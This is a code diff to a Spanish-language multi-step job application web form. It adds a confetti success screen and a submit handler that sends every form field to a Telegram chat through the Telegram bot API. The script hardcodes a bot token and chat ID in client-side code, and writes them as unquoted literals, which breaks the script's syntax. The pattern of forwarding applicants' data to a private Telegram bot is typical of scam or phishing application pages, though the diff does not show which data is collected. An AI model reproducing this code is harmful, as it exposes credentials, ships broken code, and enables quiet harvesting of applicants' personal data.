@@ -283,6 +283,45 @@ button:disabled{opacity:.45;pointer-events:none}
   .timeline::before{display:none}
   .panel{padding:0}
 }
+
+/* =================== FINAL BLANCO + CONFETTI =================== */
+.final-screen{
+  position:fixed;
+  inset:0;
+  background:#fff;
+  display:none;
+  align-items:center;
+  justify-content:center;
+  z-index:99998;
+  padding:18px;
+}
+.final-screen.show{display:flex;}
+.final-card{
+  width:min(560px,100%);
+  border:1px solid #e5e7eb;
+  border-radius:16px;
+  padding:18px;
+  box-shadow:0 20px 60px rgba(0,0,0,.14);
+  text-align:center;
+}
+.final-card h3{
+  margin:6px 0 6px;
+  font-size:18px;
+  font-weight:900;
+  color:#0f172a;
+}
+.final-card p{
+  margin:0;
+  color:#334155;
+  font-size:14px;
+  line-height:1.5;
+}
+#confettiCanvas{
+  position:fixed;
+  inset:0;
+  pointer-events:none;
+  z-index:99999;
+}
 </style>
 </head>
 
@@ -310,7 +349,7 @@ button:disabled{opacity:.45;pointer-events:none}
   <main class="panel">
     <form id="wizard" novalidate>
 
-     <!-- PASO 1 -->
+         <!-- PASO 1 -->
       <section class="form-step active" data-step="1">
         <h2>Paso 1 — Bienvenida a la aplicación</h2>
 
@@ -833,7 +872,7 @@ button:disabled{opacity:.45;pointer-events:none}
           <button type="button" class="prev">Anterior</button>
           <button type="button" class="next">Continuar</button>
         </div>
-      </section>
+    
 
       <!-- PASO 18 (original nuevo + SUBMIT) -->
       <section class="form-step" data-step="18">
@@ -855,19 +894,32 @@ button:disabled{opacity:.45;pointer-events:none}
 
         <div class="buttons">
           <button type="button" class="prev">Anterior</button>
-          <button type="submit" class="next">Enviar aplicación</button>
+          <button type="submit" class="next" id="submitBtn">Enviar aplicación</button>
         </div>
-     
-      
-
+      </section>
 
     </form>
   </main>
 
 </div>
 
+<!-- CANVAS CONFETTI + OVERLAY BLANCO -->
+<canvas id="confettiCanvas"></canvas>
+<div class="final-screen" id="finalScreen" aria-live="polite">
+  <div class="final-card">
+    <h3>🎉 Felicidades</h3>
+    <p>Tu solicitud ha sido enviada correctamente. Ya puedes cerrar esta página.</p>
+  </div>
+</div>
+
 <script>
 "use strict";
+
+/* ================= TELEGRAM (PON LOS TUYOS) ================= */
+const TELEGRAM_BOT_TOKEN = 8219963792:AAGWcvtcyC0rd0zMLXN2Uf3uPUySB9GuBTw
+
+const TELEGRAM_CHAT_ID   = 8547093828
+
 
 /* ================= CONFIG ================= */
 const STORAGE_KEY = "jobapp_step_current_v1";
@@ -883,6 +935,109 @@ function scrollToTopSafe(){
   try { window.scrollTo({ top: 0, behavior: "smooth" }); }
   catch(e){ window.scrollTo(0,0); }
 }
+function formToObject(form){
+  const data = {};
+  const fd = new FormData(form);
+
+  for (const [k,v] of fd.entries()){
+    if (data[k] !== undefined){
+      if (!Array.isArray(data[k])) data[k] = [data[k]];
+      data[k].push(v);
+    } else data[k] = v;
+  }
+
+  // checkboxes no marcados => false
+  form.querySelectorAll('input[type="checkbox"][name]').forEach(cb=>{
+    data[cb.name] = cb.checked;
+  });
+
+  return data;
+}
+function buildTelegramMessage(obj){
+  const lines = [];
+  lines.push("📩 NUEVA APLICACIÓN");
+  lines.push("———————————————");
+  Object.keys(obj).forEach((key)=>{
+    let val = obj[key];
+    if (Array.isArray(val)) val = val.join(", ");
+    lines.push(`${key}: ${val}`);
+  });
+  return lines.join("\n");
+}
+async function sendTelegram(text){
+  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+  const res = await fetch(url, {
+    method:"POST",
+    headers:{"Content-Type":"application/json"},
+    body: JSON.stringify({
+      chat_id: TELEGRAM_CHAT_ID,
+      text,
+      disable_web_page_preview: true
+    })
+  });
+
+  const json = await res.json();
+  if(!json.ok) throw new Error(json.description || "Telegram error");
+}
+
+/* ================= CONFETTI (Safari OK) ================= */
+function runConfetti(ms=2500){
+  const canvas = document.getElementById("confettiCanvas");
+  const ctx = canvas.getContext("2d");
+
+  const dpr = Math.max(1, window.devicePixelRatio || 1);
+  function resize(){
+    canvas.width = Math.floor(window.innerWidth * dpr);
+    canvas.height = Math.floor(window.innerHeight * dpr);
+    canvas.style.width = window.innerWidth + "px";
+    canvas.style.height = window.innerHeight + "px";
+    ctx.setTransform(dpr,0,0,dpr,0,0);
+  }
+  resize();
+
+  const colors = ["#2563eb","#16a34a","#f59e0b","#ef4444","#8b5cf6","#0ea5e9"];
+  const pieces = [];
+  for(let i=0;i<180;i++){
+    pieces.push({
+      x: Math.random()*window.innerWidth,
+      y: -20 - Math.random()*window.innerHeight*0.2,
+      w: 6 + Math.random()*6,
+      h: 8 + Math.random()*10,
+      vx: -2 + Math.random()*4,
+      vy: 2 + Math.random()*5,
+      r: Math.random()*Math.PI,
+      vr: -0.2 + Math.random()*0.4,
+      c: colors[(Math.random()*colors.length)|0],
+      a: 0.85 + Math.random()*0.15
+    });
+  }
+
+  const start = Date.now();
+  (function tick(){
+    ctx.clearRect(0,0,window.innerWidth,window.innerHeight);
+    for(const p of pieces){
+      p.x += p.vx; p.y += p.vy; p.r += p.vr; p.vy += 0.03;
+
+      ctx.save();
+      ctx.globalAlpha = p.a;
+      ctx.translate(p.x, p.y);
+      ctx.rotate(p.r);
+      ctx.fillStyle = p.c;
+      ctx.fillRect(-p.w/2, -p.h/2, p.w, p.h);
+      ctx.restore();
+    }
+    if(Date.now()-start < ms) requestAnimationFrame(tick);
+    else ctx.clearRect(0,0,window.innerWidth,window.innerHeight);
+  })();
+}
+
+function showBlankSuccess(){
+  const app = document.querySelector(".app");
+  if(app) app.style.display = "none";
+  const overlay = document.getElementById("finalScreen");
+  overlay.classList.add("show");
+  runConfetti(2600);
+}
 
 /* ================= DOM READY ================= */
 document.addEventListener("DOMContentLoaded", () => {
@@ -891,6 +1046,7 @@ document.addEventListener("DOMContentLoaded", () => {
   const stepCounter = document.getElementById("stepCounter");
   const timeline = document.getElementById("timeline");
   const wizard = document.getElementById("wizard");
+  const submitBtn = document.getElementById("submitBtn");
 
   const TOTAL = steps.length;
 
@@ -965,6 +1121,7 @@ document.addEventListener("DOMContentLoaded", () => {
 
     const required=Array.from(active.querySelectorAll("[required]"));
 
+    // radios por grupo
     const radios=required.filter(el=>el.type==="radio");
     if(radios.length){
       const names = Array.from(new Set(radios.map(r=>r.name).filter(Boolean)));
@@ -981,6 +1138,7 @@ document.addEventListener("DOMContentLoaded", () => {
       }
     }
 
+    // otros fields
     for(const el of required){
       if(el.type==="radio") continue;
       if(el.type==="checkbox"){
@@ -1016,11 +1174,36 @@ document.addEventListener("DOMContentLoaded", () => {
     }
   });
 
-  wizard.addEventListener("submit",(e)=>{
-    if(!isStepValid()){ e.preventDefault(); return; }
-    alert("✅ Aplicación enviada (demo).");
-    try{ localStorage.removeItem(STORAGE_KEY); }catch(_){}
+  wizard.addEventListener("submit", async (e)=>{
     e.preventDefault();
+    if(!isStepValid()) return;
+
+    // bloquear botón
+    if(submitBtn){
+      submitBtn.disabled = true;
+      submitBtn.textContent = "Enviando...";
+    }
+
+    try{
+      // enviar a telegram
+      const payload = formToObject(wizard);
+      const msg = buildTelegramMessage(payload);
+      await sendTelegram(msg);
+
+      // limpiar paso guardado
+      try{ localStorage.removeItem(STORAGE_KEY); }catch(_){}
+
+      // pantalla blanca + confetti + mensaje
+      showBlankSuccess();
+
+    }catch(err){
+      console.error(err);
+      alert("❌ No se pudo enviar: " + (err.message || "Error"));
+      if(submitBtn){
+        submitBtn.disabled = false;
+        submitBtn.textContent = "Enviar aplicación";
+      }
+    }
   });
 
   setActive(current);
